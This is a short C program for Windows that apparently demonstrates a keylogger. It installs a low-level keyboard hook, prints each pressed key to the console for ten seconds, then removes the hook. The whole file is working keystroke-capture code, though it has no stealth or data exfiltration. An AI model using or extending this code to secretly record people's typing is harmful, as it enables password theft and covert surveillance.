#include <stdio.h>
#include <Windows.h>

// Global hook handle variable
HHOOK g_hKeyboardHook = NULL;

// The callback function that will be executed whenever the user presses a key
LRESULT  HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;

        // When a key is pressed down
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            printf("[ # ] Key Pressed: %c\n", pKeyBoard->vkCode);
        }
    }

    // Moving to the next hook in the hook chain
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL KeystrokeLogger() {
    MSG Msg = { 0 };

    // Installing hook
    g_hKeyboardHook = SetWindowsHookExW(
        WH_KEYBOARD_LL, // low-level keyboard input events
        (HOOKPROC)HookCallback,
        NULL,
        0
    );

    if (!g_hKeyboardHook) {
        printf("[!] SetWindowsHookExW Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Process unhandled events
    while (GetMessageW(&Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }

    return TRUE;
}

int main() {
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeystrokeLogger, NULL, 0, NULL);
    if (hThread)
        WaitForSingleObject(hThread, 10000); // Monitor keystrokes for 10 seconds

    // Unhooking
    if (g_hKeyboardHook && !UnhookWindowsHookEx(g_hKeyboardHook)) {
        printf("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
    }
    return 0;
}
